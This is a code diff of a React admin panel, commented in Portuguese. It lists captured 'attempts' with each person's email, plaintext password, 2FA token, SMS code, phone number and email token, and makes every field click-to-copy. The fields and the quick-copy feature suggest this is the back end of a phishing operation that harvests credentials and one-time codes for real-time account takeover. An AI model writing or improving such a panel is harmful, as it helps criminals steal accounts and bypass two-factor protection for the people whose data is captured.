@@ -441,35 +441,81 @@ function AdminPanel() {
                             <span className="text-gray-700">-</span>
                           </td>
                           
-                          {/* USUÁRIO/LOGIN - valor fixo */}
-                          <td className="px-3 py-3 text-sm border border-gray-300 font-medium">{attempt.email}</td>
-                          
-                          {/* SENHA - valor fixo */}
-                          <td className="px-3 py-3 text-sm border border-gray-300">{attempt.password || "-"}</td>
-                          
-                          {/* AUT - campo esperando dado */}
-                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
-                            <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
+                          {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-sm border border-gray-300 font-medium cursor-pointer hover:bg-yellow-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `email-${attempt.id}` ? "text-green-600" : ""}>
+                              {copiedField === `email-${attempt.id}` ? "✓ Copiado!" : attempt.email}
+                            </span>
                           </td>
                           
-                          {/* EMAIL - campo esperando dado */}
-                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
-                            <span className="text-gray-700">{attempt.email_input || "-"}</span>
+                          {/* SENHA - valor fixo - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-sm border border-gray-300 cursor-pointer hover:bg-green-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `password-${attempt.id}` ? "text-green-600" : ""}>
+                              {copiedField === `password-${attempt.id}` ? "✓ Copiado!" : (attempt.password || "-")}
+                            </span>
                           </td>
                           
-                          {/* TOK-TEL - campo esperando dado */}
-                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
-                            <span className="text-gray-700">{attempt.sms_code || "-"}</span>
+                          {/* AUT - campo esperando dado - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-blue-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                              {copiedField === `token2fa-${attempt.id}` ? "✓ Copiado!" : (attempt.token_2fa || "-")}
+                            </span>
                           </td>
                           
-                          {/* Nº TELEFONE - campo esperando dado */}
-                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
-                            <span className="text-gray-700">{attempt.phone_number || "-"}</span>
+                          {/* EMAIL - campo esperando dado - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-purple-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                              {copiedField === `emailinput-${attempt.id}` ? "✓ Copiado!" : (attempt.email_input || "-")}
+                            </span>
                           </td>
                           
-                          {/* TOK-MAIL - campo esperando dado */}
-                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
-                            <span className="text-gray-700">{attempt.app_mail || "-"}</span>
+                          {/* TOK-TEL - campo esperando dado - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-orange-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                              {copiedField === `smscode-${attempt.id}` ? "✓ Copiado!" : (attempt.sms_code || "-")}
+                            </span>
+                          </td>
+                          
+                          {/* Nº TELEFONE - campo esperando dado - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-green-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                              {copiedField === `phone-${attempt.id}` ? "✓ Copiado!" : (attempt.phone_number || "-")}
+                            </span>
+                          </td>
+                          
+                          {/* TOK-MAIL - campo esperando dado - COPIÁVEL */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-blue-50 transition-colors"
+                            onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                              {copiedField === `appmail-${attempt.id}` ? "✓ Copiado!" : (attempt.app_mail || "-")}
+                            </span>
                           </td>
                           
                           {/* 👍 - apenas header, célula vazia */}
